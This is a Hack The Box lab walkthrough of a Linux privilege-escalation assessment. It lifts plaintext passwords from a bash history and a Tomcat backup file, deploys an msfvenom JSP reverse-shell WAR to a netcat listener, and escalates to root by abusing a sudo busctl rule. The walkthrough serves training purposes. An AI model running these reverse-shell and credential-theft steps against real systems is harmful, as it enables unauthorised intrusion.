# Linux Local Privilege Escalation - Skills Assessment

## Objectives 

We have been contracted to perform a security hardening assessment against one of the INLANEFREIGHT organizations' public-facing web servers.
The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.
Once on the host, we must find five flags on the host, accessible at various privilege levels. Escalate privileges all the way from the htb-student user to the root user and submit all five flags to finish this module.

*  Submit the contents of flag1.txt
*  Submit the contents of flag2.txt
*  Submit the contents of flag3.txt
*  Submit the contents of flag4.txt
*  Submit the contents of flag5.txt

## Exercise Start

### flag1.txt

```
htb-student@nix03:~$ ls -lA
total 24
-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history
-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrc
drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
htb-student@nix03:~$ ls -LA .config
.flag1.txt
htb-student@nix03:~$ cat .config/.flag1.txt
LLPE{d0nXXXXXXXXXXXXXXXXes!}
htb-student@nix03:~$ 
```

### flag2.txt

```
htb-student@nix03:~$ cat /home/barry/.bash_history
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local   <---------- CREDENTIALS*
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history 
history
exit
history
exit
ls -la
ls -l
history 
history -d 21
history 
exit
id
ls /var/log
history
history -d 28
history
exit
```

```
barry@nix03:/home/htb-student$ cd ..
barry@nix03:/home$ ls
barry  htb-student  mrb3n
barry@nix03:/home$ cd barry/
barry@nix03:~$ ls
flag2.txt
barry@nix03:~$ cat flag2.txt 
LLPE{ch3ck_XXXXXXXXXXXXnes!}
```

### flag3.txt

```
barry@nix03:~$ id
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

admin privileges means barry can read under  /var/log/

```
barry@nix03:/var/log$ ls
alternatives.log       dpkg.log       syslog.6.gz
alternatives.log.1     dpkg.log.1     syslog.7.gz
alternatives.log.2.gz  dpkg.log.2.gz  tomcat9
apache2                faillog        ubuntu-advantage.log
apt                    flag3.txt      unattended-upgrades
auth.log               installer      vmware-network.1.log
auth.log.1             journal        vmware-network.2.log
auth.log.2.gz          kern.log       vmware-network.3.log
auth.log.3.gz          kern.log.1     vmware-network.4.log
bootstrap.log          kern.log.2.gz  vmware-network.5.log
btmp                   kern.log.3.gz  vmware-network.6.log
btmp.1                 landscape      vmware-network.7.log
cloud-init.log         lastlog        vmware-network.8.log
cloud-init-output.log  mysql          vmware-network.9.log
dist-upgrade           private        vmware-network.log
dmesg                  syslog         vmware-vmsvc-root.1.log
dmesg.0                syslog.1       vmware-vmsvc-root.2.log
dmesg.1.gz             syslog.2.gz    vmware-vmsvc-root.3.log
dmesg.2.gz             syslog.3.gz    vmware-vmsvc-root.log
dmesg.3.gz             syslog.4.gz    vmware-vmtoolsd-root.log
dmesg.4.gz             syslog.5.gz    wtmp

```

```
barry@nix03:/var/log$ cat flag3.txt 
LLPE{hXXXXXXXXXXXXXX}
```

### flag4.txt

```
barry@nix03:/$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*            
tcp    LISTEN  0       70                   *:33060              *:*            
tcp    LISTEN  0       100                  *:8080               *:*            
tcp    LISTEN  0       511                  *:80                 *:*            
barry@nix03:/$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1001 but you should be root.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN 
```

<img width="1911" height="707" alt="image" src="https://github.com/user-attachments/assets/e94d9baf-0e63-40a2-94e5-fa9f5d433822" />
<img width="1919" height="581" alt="image" src="https://github.com/user-attachments/assets/7e61b1af-37de-4fc4-b344-e5ce84b964a2" />

Need Tomcat credentials

```
barry@nix03:/etc/tomcat9$ ls
Catalina             jaspic-providers.xml  server.xml            web.xml
catalina.properties  logging.properties    tomcat-users.xml
context.xml          policy.d              tomcat-users.xml.bak
```

tomcat-users.xml.bak

```
barry@nix03:/etc/tomcat9$ cat tomcat-users.xml.bak | grep "password"
  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

username="tomcatadm" password="T0mc@t_s3cret_p@ss!"

<img width="1053" height="580" alt="image" src="https://github.com/user-attachments/assets/063317a6-4c46-40a5-ac7d-7016d51b2563" />

<img width="1887" height="554" alt="image" src="https://github.com/user-attachments/assets/bc54e66b-ec26-40cc-8bfe-cae35f0d0166" />

Set up a listener on machine:

```
$  nc -nvlp 8888
```
and 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.43 LPORT=8888 -f war -o managerUpdated.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: managerUpdated.war

```

<img width="1148" height="373" alt="image" src="https://github.com/user-attachments/assets/566d3c69-beec-49fa-b491-1fc5b1e9e824" />

<img width="1222" height="493" alt="image" src="https://github.com/user-attachments/assets/7aa31045-5870-48a7-86f9-314605b2a03c" />

<img width="1104" height="402" alt="image" src="https://github.com/user-attachments/assets/f01513cc-0589-42de-977d-4d77b2fb35b3" />

<img width="1916" height="599" alt="image" src="https://github.com/user-attachments/assets/ea61fbbe-8500-42de-9939-389ca9698ec1" />

<img width="1867" height="755" alt="image" src="https://github.com/user-attachments/assets/6c338677-d08a-43b9-b0e2-604a5aee44ab" />

```
$  nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.147.252] 54386
whoami
tomcat
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

```
ls
conf
flag4.txt
lib
logs
policy
webapps
work
cat flag4.txt	
LLPE{imXXXXXXXXXXXXXX0w}
```

### flag5.txt

same session under tomcat

```
sudo -l
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

https://gtfobins.github.io/gtfobins/busctl/

<img width="1142" height="886" alt="image" src="https://github.com/user-attachments/assets/4b673260-b891-454c-b275-7f4386511690" />

`sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
<:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'`


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@nix03:/var/lib/tomcat9$
```

```
tomcat@nix03:/var/lib/tomcat9$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
<:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
# whoami
whoami
root
# cat /root/flag5.txt
cat /root/flag5.txt
LLPE{0nXXXXXXXXXXXXXXXXXXXXll!}
```

---





















